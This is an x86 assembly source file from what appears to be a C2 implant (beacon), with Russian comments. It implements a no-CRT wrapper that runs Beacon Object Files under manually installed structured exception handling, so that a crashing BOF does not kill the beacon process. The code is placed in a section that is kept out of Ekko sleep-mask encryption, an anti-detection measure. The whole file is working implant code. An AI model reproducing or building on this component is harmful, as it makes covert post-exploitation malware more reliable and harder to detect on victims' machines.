; bof_call_x86.asm — x86 обёртка вызова BOF с ручным SEH.
;
; На x86 __try/__except требует _except_handler3 из CRT, которого нет
; в no-CRT сборке. Реализуем SEH вручную через FS:[0].
;
; При исключении внутри BOF записываем код ошибки в *seh_code
; и возвращаемся в эпилог, не убивая бикон-процесс.
;
; void __cdecl bof_call_x86(void* ep, const char* args, int args_len, DWORD* seh_code)
;   [ebp+8]  = ep
;   [ebp+12] = args
;   [ebp+16] = args_len
;   [ebp+20] = seh_code

.386
.model flat, C
option casemap:none

; Разрешаем явное использование FS — flat model считает его ERROR.
ASSUME fs:NOTHING

; Помещаем функции в секцию .sleep (не шифруется Ekko при засыпании).
sleep_seg SEGMENT DWORD PUBLIC FLAT 'CODE'

; --------------------------------------------------------------------------
; Обработчик исключения — вызывается ОС при ACCESS_VIOLATION и т.п.
;
; Аргументы на стеке (кладутся ОС):
;   [esp+4]  = EXCEPTION_RECORD*
;   [esp+8]  = EXCEPTION_REGISTRATION* (наш расширенный фрейм)
;   [esp+12] = CONTEXT*
;   [esp+16] = DispatcherContext*
;
; Наш фрейм на стеке:
;   +0:  prev (старый FS:[0])
;   +4:  handler (адрес этой функции)
;   +8:  saved_esp
;   +12: seh_code_ptr
;   +16: safe_exit addr
; --------------------------------------------------------------------------
bof_seh_handler PROC
    mov     eax, [esp+4]          ; EXCEPTION_RECORD*
    mov     ecx, [eax]            ; ExceptionCode

    mov     edx, [esp+8]          ; EXCEPTION_REGISTRATION* (наш фрейм)

    ; Записываем код исключения по указателю.
    mov     eax, [edx+12]         ; seh_code_ptr
    mov     [eax], ecx            ; *seh_code = ExceptionCode

    ; Правим CONTEXT чтобы продолжить с safe_exit.
    mov     eax, [esp+12]         ; CONTEXT*
    ; CONTEXT.Eip = offset 0xB8 (184), CONTEXT.Esp = offset 0xC4 (196)
    mov     ecx, [edx+16]         ; safe_exit
    mov     [eax+0B8h], ecx       ; CONTEXT.Eip = safe_exit
    mov     ecx, [edx+8]          ; saved_esp
    mov     [eax+0C4h], ecx       ; CONTEXT.Esp = saved_esp

    ; ExceptionContinueExecution = 0
    xor     eax, eax
    ret
bof_seh_handler ENDP

; --------------------------------------------------------------------------
; bof_call_x86(ep, args, args_len, seh_code) — cdecl
; --------------------------------------------------------------------------
bof_call_x86 PROC
    push    ebp
    mov     ebp, esp
    push    ebx
    push    esi
    push    edi

    ; Сохраняем аргументы в нелетучих регистрах.
    mov     ebx, [ebp+8]          ; ep
    mov     esi, [ebp+12]         ; args
    mov     edi, [ebp+16]         ; args_len

    ; Обнуляем *seh_code (0 = нет ошибки).
    mov     eax, [ebp+20]         ; seh_code ptr
    mov     dword ptr [eax], 0

    ; ---- Устанавливаем ручной SEH-фрейм ----
    lea     ecx, _safe_exit
    push    ecx                   ; +16: safe_exit
    mov     eax, [ebp+20]
    push    eax                   ; +12: seh_code_ptr
    push    0                     ; +8:  saved_esp (заполним ниже)
    push    offset bof_seh_handler ; +4: handler
    push    dword ptr fs:[0]      ; +0:  prev

    ; Фиксируем saved_esp и регистрируем фрейм.
    mov     [esp+8], esp
    mov     fs:[0], esp

    ; ---- Вызываем BOF entry point (cdecl) ----
    push    edi                   ; args_len
    push    esi                   ; args
    call    ebx                   ; ep(args, args_len)
    add     esp, 8                ; чистим аргументы

_safe_exit:
    ; ---- Снимаем SEH-фрейм ----
    pop     dword ptr fs:[0]      ; восстанавливаем prev
    add     esp, 16               ; handler + saved_esp + seh_code_ptr + safe_exit

    pop     edi
    pop     esi
    pop     ebx
    pop     ebp
    ret
bof_call_x86 ENDP

sleep_seg ENDS

END
